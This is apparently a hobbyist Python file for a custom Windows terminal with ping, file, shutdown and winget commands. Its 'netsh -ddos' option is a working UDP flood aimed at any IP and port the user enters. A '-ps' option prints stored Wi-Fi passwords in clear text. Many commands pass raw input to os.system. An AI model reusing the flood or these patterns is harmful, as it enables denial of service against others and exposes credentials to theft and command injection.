import subprocess
import platform
import socket
import time
import os
os.system("title Rafi Terminal")
import glob
import pyfiglet
import sys
import keyboard
import socket, random, time

def progressbar(it, prefix="", size=60, out=sys.stdout): # Python3.3+
    count = len(it)
    def show(j):
        x = int(size*j/count)
        print("{}[{}{}] {}/{}".format(prefix, u"#"*x, "."*(size-x), j, count), 
                end='\r', file=out, flush=True)
    show(0)
    for i, item in enumerate(it):
        yield item
        show(i+1)
    print(flush=True, file=out)

ascii_banner = pyfiglet.figlet_format("Rafael")
print(ascii_banner)

print("Rafi Terminal [Version 1.0]")
print("------------------------------------")

username = os.getlogin()
hostname = socket.gethostname()
ip = socket.gethostbyname(hostname)

os.chdir("C:\\Users\\" + username)

while True:
    currentdir = os.getcwd()
    cmd = input(username + "@" + currentdir + "$ ")
    if cmd == "":
        pass

    elif "netsh" in cmd[:5]:
        arg = cmd[6:11]
        if arg == "-ping":
            usg = cmd[12:]
            os.system("ping -l 1452 " + usg)

        elif arg == "-show":
            usg = cmd[12:15]
            print(usg)
            if usg == "-an":
                print("Avalibal Networks:")
                os.system("netsh wlan show network")

            elif usg == "-ps":
                os.system("netsh wlan show profiles")
                pssrd = input("Wlan: ")
                os.system("netsh wlan show profile " + pssrd + " key=clear")

        elif arg == "-ddos":
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                ip = input("Enter Target IP: ")
                port = int(input("Enter Target Port: "))
                sleep = float(input("Sleep: "))
                s.connect((ip, port))
            except:
                print("self.socket.INET Error:")
                print("Cound not connect to device")
            try:
                for i in range(1, 100**100000):
                    s.send(random._urandom(10)*1000)
                    print(f"Send: {i}", end='\r')
                    time.sleep(sleep)
            except:
                print("Self.socket.send Error:")
                print("There was an error sending the packages!")

        else:
            print("self.args Error:")
            print("netsh has no distribute '" + arg + "'")

    elif cmd[:4] == "help":
        usg = cmd[5:7]
        if usg == "-i":
            help_to = input("Command help: ")
            if help_to == "netsh":
                print("Netsh help")
                print("Netsh can have commands for networking and connecting")
                print("Arguments for netsh:")
                print('     "-ping":')
                print('          Ping something with a little bit of data to make sure there is a connection')
                print('          It also shows sates of a lose and a return of data')
                print('          Usage:')
                print('               Add a ip like "10.0.0.7" or NetAdress like "www.google.com"')
                print('               Return self.error by not give addres or incorect address')
                print('\n')
                print('     "-show":')
                print('          Shows sertain thing more in usg')
                print('          Usage:')
                print('               "-an" to show avalibal networks')
                print('               "-os" show known password of a give network')
                print('\n')
                print('     "-ddos":')
                print('          Sends very much data packges and can make a server/network offline')
                print('          This is Illegal if you use this for enamies')
                print("\n")

            elif help_to == "say":
                print("Say help")
                print("Prints given text from user to print in terminal")
                print("Arguments for say:")
                print('     [text] prints given text in [text]')
                print("\n")

            elif help_to == "shutdown":
                print("Shutdown help")
                print("Shuts down the current device")
                print("Arguments for shutdown")
                print('     "/a" will stop if a shutdown is intended')
                print("\n")

            elif help_to == "restart":
                print("Restart help")
                print("Will restart the current device")
                print("Arguments for restart")
                print("     --none--")
                print("\n")

            elif help_to == "msg":
                print("Msg help")
                print("Will msg to the current device")
                print("Arguments for msg")
                print("     [text] will show the given text as a messagebox")
                print("\n")

            elif help_to == "vol":
                print('Vol help')
                print('Shows details about windows installationes HHD')
                print('Agruments for vol')
                print('     --none--')
                print('\n')

            elif help_to == "help":
                print('Help help')
                print('Shows avalibal commands')
                print('Arguments for Help')
                print('     --none--')
                print('\n')

            elif help_to == "dir":
                print('Dir help')
                print('Dir changes or shows cwdir')
                print('Arguments for dir')
                print('     [text] if you what to chage dir')
                print('\n')

            elif help_to == "ls":
                print("Ls help")
                print('Ls shows all files and dir in a dir')
                print('Arguments for ls')
                print('     "-uo" shows dir content')
                print('\n')

            elif help_to == "apt":
                print('Apt help')
                print('Apt install Apps/Programms with winget')
                print('Arguments for apr')
                print('     "-i" install package')
                print('          [text] pakage to install')
                print('\n')

            elif help_to == "chos":
                print("Chos help")
                print("Compars os with original from windows")
                print("Arguments for chos")
                print("     --none--")
                print("\n")

            elif help_to == "clear":
                print("Cls help")
                print("Clears the current Terminalscreen")
                print("Arguments for cls")
                print("     --none--")
                print("\n")

            elif help_to == "title":
                print("Title help")
                print("Changes the title of the Termianl Window")
                print("Arguments for title")
                print("     --none--")
                print("\n")

            elif help_to == "exit":
                print('Exit help')
                print("Exit simply exits the programm")
                print('Arguments for exit:')
                print('     --none--')
                print('\n')

            elif help_to == "start":
                print("Start help")
                print("Start will start a given Programm or address")
                print("Arguments for start")
                print('     [text] program/dir/addres input')
                print("\n")

            elif help_to == "cmd":
                print("Cmd help")
                print("Start cmd termianl or execute cmd commands")
                print("Arguments for cmd")
                print("     [text] if you whant to execute a command in a subshell")

            elif help_to == "notepad":
                print("Notepad help")
                print("Starts notepad")
                print("Arguments for notepad")
                print("     [text] file to start")
                print("\n")

            elif help_to == "pprint":
                print("Pprint help")
                print("Prints a decorated text")
                print("Arguments for pprint")
                print('     [text] to pprint')
                print("\n")

            elif help_to == "fprint":
                print("Fprint help")
                print("Prints file content")
                print("Arguments for fprint")
                print("     [text] file to fprint")
                print("\n")

            elif help_to == "cd":
                print("cd help")
                print("Changes the current dir")
                print("Arguments for cd")
                print("     [dir] dir to change to")
                print("\n")
                
            else:
                print("self.tocken Error:")
                print("No help for '" + help_to + "' not found")

        else:
            print('Help:')
            print("\n")
            print('     "help" shows avalibel commands')
            print('     "netsh" wlan and internet tools')
            print('     "exit" exit terminal')
            print('     "say" prints given text in the terminal')
            print('     "help" prints help')
            print('     "dir" show current dir add to cange dir')
            print('     "cd" changes the current dir')
            print('     "ls" show files and dir in a dir')
            print('     "shutdown" shuts down the device')
            print('     "restart" restarts the device')
            print('     "msg" shows a messagebox')
            print('     "vol" shows details about Windows Installation Drive')
            print('     "apt" installation package')
            print('     "chos" compars os from windows')
            print('     "clear" clears the current screen')
            print('     "title" changes the title of the screen')
            print('     "start" start program or webpage')
            print('     "cmd" start cmd and execute commands')
            print('     "notepad" starts notepad/file')
            print('     "pprint" makes a decorated print')
            print('     "fprint" print files content')
            print('\n')
            print('For help on a certain command type:')
            print('help -i "command"')

    elif "say" in cmd[:3]:
        if len(cmd) > 4:
            say_to = cmd[4:]
            print(say_to)
        else:
            print("Print.In.Str Error:")
            print("No text was given")

    elif "vol" == cmd:
        os.system("vol")

    elif "msg" == cmd[:3]:
        if len(cmd) > 4:
            msg = cmd[4:]
            os.system("msg * " + msg)
        else:
            print("No given msg")
            
    elif "shutdown" == cmd:
        print("Shuting down...")
        os.system('shutdown /s /t 15 /c "Bubble Terminal has configured a shutdown"')

    elif "restart" == cmd:
        print("Rebooting...")
        os.system('shutdown /r /t 15 /c "Bubble Terminal has configured a reboot"')

    elif "shutdown /a" == cmd:
        print("Stoping shutdowns...")
        os.system("shutdown /a")

    elif cmd == "dir":
        active_dir = os.getcwd()
        print(active_dir)

    elif cmd[:3] == "dir":
        try:
            cd_dir = cmd[4:]
            os.chdir(cd_dir)

        except:
            print("Self.chdir Error:")
            print("Chould not change dir")
            print("Make sure no mistakes are made by the give dir")

    elif cmd == "cd":
        print("self.changdir Error:")
        print("No direcotory given!")

    elif cmd[:3] == "cd":
        try:
            cd_dir = cmd[4:]
            os.chdir(cd_dir)

        except:
            print("Self.chdir Error:")
            print("Chould not change dir")
            print("Make sure no mistakes are made by the give dir")

    elif cmd == "ls":
        os.system("dir")

    elif cmd == "ls --uo":
        os.system("tree /f")

    elif cmd[:3] == "apt":
        arg = cmd[4:6]
        if arg == "-i":
            to_install = cmd[7:]
            os.system("winget install " + to_install)

        elif arg == "-u":
            if len(cmd) > 7:
                to_install = cmd[7:]
                os.system("winget upgrade " + to_install)

            else:
                os.system("winget upgrade")
        else:
            print("Self.arg Error:")
            print("Arg not found or not given")

    elif cmd[:6] == "chos":
        for i in progressbar(range(100), "Connecting     ", 40):
            time.sleep(0.0005)
        os.system("cls")
        os.system("sfc /scannow")

    elif cmd == "clear":
        os.system("cls")

    elif "title" == cmd[:5]:
        if len(cmd) > 6:
            title = cmd[6:]
            os.system("title " + title)
        else:
            print("Self.Title Error:")
            print("No text given")

    elif "start" == cmd[:5]:
        if len(cmd) > 7:
            to_start = cmd[6:]
            os.system("start " + to_start)
        else:
            print("Self.start Error:")
            print("No text given")

    elif "cmd" == cmd[:3]:
        if len(cmd) > 4:
            command = cmd[4:]
            os.system(command)
        else:
            os.system("start cmd")

    elif "notepad" == cmd[:7]:
        if len(cmd) > 8:
            try:
                file = cmd[8:]
                os.system("notepad " + file)
            except:
                print("Self.start Error:")
                print("Could not start notepad/file")
        else:
            try:
                os.system("notepad")
            except:
                print("Self.start Error:")
                print("Could not start notepad")

    
    elif cmd == "exit":
        exit(0)

    elif cmd[:6] == "pprint":
        if len(cmd) > 7:
            txt_pprint = cmd[7:]
            to_pprint = pyfiglet.figlet_format(txt_pprint)
            print(to_pprint)
        else:
            print("Self.pprint Error:")
            print("No text to pprint was given")

    elif cmd[:6] == "fprint":
        if len(cmd) > 7:
            to_fprint = cmd[7:]
            if to_fprint[1:] in os.listdir(os.getcwd()):
                to_fprint_cwd = to_fprint[1:]
                current_path = os.getcwd()
                print(current_path + to_fprint)
                os.system("powershell cat " + current_path + to_fprint)
            else:
                os.system("powershell cat " + to_fprint)

        else:
            print("Self.fprint Error:")
            print("No file/text given")
        
    elif cmd in os.listdir(os.getcwd()):
        os.system("start " + cmd)

    else:
        print("Runtime Error:")
        print("'" + cmd + "' is not defined")
